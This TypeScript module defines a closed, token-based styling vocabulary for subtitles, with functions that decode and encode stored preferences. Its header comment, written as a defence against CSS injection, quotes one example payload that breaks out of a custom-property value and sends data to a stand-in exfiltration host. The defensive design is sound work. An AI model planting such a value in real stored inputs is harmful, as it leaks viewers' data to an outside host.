/* -------------------------------------------------------------------------
 * Subtitle presentation: a serialisable styling model with a closed
 * vocabulary (W132-D, item 2)
 *
 * ==========================================================================
 * WHY A CLOSED VOCABULARY AND NOT A COLOUR PICKER
 * ==========================================================================
 *
 * The defect class this removes is CSS INJECTION THROUGH A STORED PREFERENCE.
 * The obvious shape for this feature is `{ colour: string }` written into a
 * `style` attribute or a custom property. A custom property is a *value*
 * context, so the usual reflex — "it is only a colour, the browser will ignore
 * junk" — is wrong in a specific and well-known way: a stored value of
 * `red; background-image: url(https://exfil.invalid/?c=...)` closes the
 * declaration and opens another, and `var()` substitution happens before the
 * declaration is parsed. The value arrives from a profile row that an API
 * route writes, so this is a stored-input path and not a literal in the source.
 *
 * Validating with a regex would be a second opinion that has to stay correct
 * forever. Instead every visible value is a TOKEN — a key into a frozen map
 * this file owns — and the only strings that ever reach CSS are the ones
 * written below. A junk token does not render as junk; it fails the decode and
 * is reported.
 *
 * The second reason is a product one: a free colour picker lets a viewer choose
 * white text on a white background and lose their subtitles with no way back,
 * which is an accessibility regression dressed as a feature. The palette below
 * is the set that keeps a legible contrast against video.
 *
 * ==========================================================================
 * WHAT IS REAL HERE AND WHAT IS NOT
 * ==========================================================================
 *
 * This module decides PRESENTATION ONLY, and the honest boundary matters: it
 * changes how a cue looks, it does not select a track, re-time a cue, or render
 * text. `cssVariables` returns a plain record of custom-property names to
 * values; applying it is the component's job and whether the engine's text
 * display honours a given property is the engine's. Nothing here claims an
 * observed rendering.
 *
 * ==========================================================================
 * DEFAULTS ARE "NOT CHOSEN", AND THAT DISTINCTION SURVIVES THE STORE
 * ==========================================================================
 *
 * `viewer-preferences.ts` makes the same argument for audio languages and it
 * applies verbatim: a profile that has never been configured and a profile that
 * explicitly chose the default must be told apart, because a future change to
 * the product default must move the first and not the second. `decodeSubtitleStyle`
 * therefore reports per-field reasons rather than merging into a default and
 * forgetting.
 *
 * NOTHING HERE READS A BROWSER API, A CLOCK OR A STORE. Module evaluation
 * builds frozen records only, so importing this file cannot throw in a
 * WebView2 build.
 * ---------------------------------------------------------------------- */

/* ===========================================================================
 * THE VOCABULARY
 * ======================================================================== */

/**
 * Text size as a MULTIPLIER of the player's own cue size, not a pixel value.
 *
 * Pixels would be wrong on both targets at once: the same 24px is unreadable on
 * a 4K television across a room and enormous in a 400px-wide window. A
 * multiplier composes with whatever the surface already scales cues by.
 */
export const SUBTITLE_SIZES = Object.freeze({
  small: 0.75,
  medium: 1,
  large: 1.5,
  "extra-large": 2
} as const);

export type SubtitleSize = keyof typeof SUBTITLE_SIZES;

/** Foreground colours. Every one is legible on the backgrounds below. */
export const SUBTITLE_COLOURS = Object.freeze({
  white: "#ffffff",
  "soft-white": "#e6e6e6",
  yellow: "#ffd600",
  cyan: "#00e5ff",
  green: "#76ff03",
  black: "#000000"
} as const);

export type SubtitleColour = keyof typeof SUBTITLE_COLOURS;

/**
 * Cue backgrounds, including two that are not opaque.
 *
 * `none` is a real choice and not an absence: a viewer who wants an unboxed cue
 * relies on `edge` for separation from the picture, which is why the two fields
 * are independent and why `none`/`none` is permitted — it is legible on dark
 * footage and the model does not pretend to know what the footage is.
 */
export const SUBTITLE_BACKGROUNDS = Object.freeze({
  none: "transparent",
  "translucent-black": "rgba(0, 0, 0, 0.6)",
  black: "#000000",
  "translucent-white": "rgba(255, 255, 255, 0.6)"
} as const);

export type SubtitleBackground = keyof typeof SUBTITLE_BACKGROUNDS;

/**
 * Character edge, as a ready-made `text-shadow` value.
 *
 * These are the four edge styles the CEA-708/WebVTT accessibility settings on
 * every television and operating system offer, named the same way, so a viewer
 * who has already configured captions elsewhere recognises the control.
 */
export const SUBTITLE_EDGES = Object.freeze({
  none: "none",
  outline:
    "-1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000",
  "drop-shadow": "2px 2px 3px rgba(0, 0, 0, 0.9)",
  raised: "1px 1px 0 #555, 2px 2px 0 #000",
  depressed: "-1px -1px 0 #555, -2px -2px 0 #000"
} as const);

export type SubtitleEdge = keyof typeof SUBTITLE_EDGES;

export interface SubtitleStyle {
  readonly size: SubtitleSize;
  readonly colour: SubtitleColour;
  readonly background: SubtitleBackground;
  readonly edge: SubtitleEdge;
}

/**
 * The product default: medium white text in a translucent box with no edge.
 *
 * A box RATHER THAN an outline, because a box is legible over every kind of
 * footage without knowing anything about it, and the default has to be the safe
 * one. A viewer who prefers an unboxed cue can say so.
 */
export const DEFAULT_SUBTITLE_STYLE: SubtitleStyle = Object.freeze({
  size: "medium",
  colour: "white",
  background: "translucent-black",
  edge: "none"
});

/* ===========================================================================
 * PROJECTION TO CSS
 * ======================================================================== */

/**
 * The custom properties a cue container reads.
 *
 * Returned as DATA rather than applied, so this is testable with no DOM, and so
 * the component holds no second copy of the mapping. Every value is one of the
 * literals above — a token that failed to decode never gets here, because
 * `SubtitleStyle` is only constructible through `decodeSubtitleStyle` or the
 * frozen default.
 */
export const SUBTITLE_CSS_VARIABLES = Object.freeze({
  size: "--liberty-cue-scale",
  colour: "--liberty-cue-colour",
  background: "--liberty-cue-background",
  edge: "--liberty-cue-edge"
} as const);

export function cssVariables(style: SubtitleStyle): Readonly<Record<string, string>> {
  return Object.freeze({
    [SUBTITLE_CSS_VARIABLES.size]: String(SUBTITLE_SIZES[style.size]),
    [SUBTITLE_CSS_VARIABLES.colour]: SUBTITLE_COLOURS[style.colour],
    [SUBTITLE_CSS_VARIABLES.background]: SUBTITLE_BACKGROUNDS[style.background],
    [SUBTITLE_CSS_VARIABLES.edge]: SUBTITLE_EDGES[style.edge]
  });
}

/* ===========================================================================
 * SERIALISATION
 * ======================================================================== */

/** The field names a stored style carries. Named so a test can walk them. */
export const SUBTITLE_STYLE_FIELDS = Object.freeze([
  "size",
  "colour",
  "background",
  "edge"
] as const);

export type SubtitleStyleField = (typeof SUBTITLE_STYLE_FIELDS)[number];

export type FieldDecodeReason =
  /** The field was absent. Not a failure; the viewer never chose. */
  | "not_chosen"
  /** The field held a token this build knows. */
  | "stored"
  /** The field held something that is not one of this build's tokens. */
  | "unknown_token";

export interface SubtitleStyleDecode {
  readonly style: SubtitleStyle;
  /** Per field, why it is what it is. Product invariant 4 applied to a setting. */
  readonly reasons: Readonly<Record<SubtitleStyleField, FieldDecodeReason>>;
  /** True when every field was `stored`: nothing was defaulted or rejected. */
  readonly complete: boolean;
}

const VOCABULARIES: Readonly<Record<SubtitleStyleField, Readonly<Record<string, unknown>>>> =
  Object.freeze({
    size: SUBTITLE_SIZES,
    colour: SUBTITLE_COLOURS,
    background: SUBTITLE_BACKGROUNDS,
    edge: SUBTITLE_EDGES
  });

/**
 * A style read back from a store, with a reason per field.
 *
 * A BAD FIELD DOES NOT DISCARD THE OTHER THREE, which is the behaviour an
 * all-or-nothing schema parse would give. A viewer who set extra-large yellow
 * text under a build that spelled an edge differently keeps their size and
 * colour; losing all four over one renamed token is the regression.
 *
 * `unknown_token` is kept distinct from `not_chosen` because the two call for
 * opposite responses from the caller: the first is a migration to write back,
 * the second is a viewer to leave alone.
 */
export function decodeSubtitleStyle(raw: unknown): SubtitleStyleDecode {
  const source: Record<string, unknown> =
    typeof raw === "object" && raw !== null && !Array.isArray(raw)
      ? (raw as Record<string, unknown>)
      : {};
  const reasons: Record<SubtitleStyleField, FieldDecodeReason> = {
    size: "not_chosen",
    colour: "not_chosen",
    background: "not_chosen",
    edge: "not_chosen"
  };
  const style: Record<string, string> = { ...DEFAULT_SUBTITLE_STYLE };

  for (const field of SUBTITLE_STYLE_FIELDS) {
    const value = source[field];
    if (value === undefined || value === null || value === "") continue;
    /* `Object.hasOwn` and not `in`, so `"toString"` or `"__proto__"` cannot name
     * a member of a prototype chain and smuggle a value past the vocabulary. */
    if (typeof value === "string" && Object.hasOwn(VOCABULARIES[field], value)) {
      style[field] = value;
      reasons[field] = "stored";
    } else {
      reasons[field] = "unknown_token";
    }
  }

  return {
    style: Object.freeze(style) as unknown as SubtitleStyle,
    reasons: Object.freeze(reasons),
    complete: SUBTITLE_STYLE_FIELDS.every((field) => reasons[field] === "stored")
  };
}

/** The storable form: tokens only, never resolved CSS. */
export function encodeSubtitleStyle(style: SubtitleStyle): Readonly<Record<string, string>> {
  return Object.freeze({
    size: style.size,
    colour: style.colour,
    background: style.background,
    edge: style.edge
  });
}

/**
 * One field changed, with the rest kept.
 *
 * Exists so a settings screen does not build a style object by hand and get a
 * field name wrong in a way the type system cannot see through an index.
 */
export function withSubtitleStyleField<F extends SubtitleStyleField>(
  style: SubtitleStyle,
  field: F,
  value: SubtitleStyle[F]
): SubtitleStyle {
  return Object.freeze({ ...style, [field]: value });
}
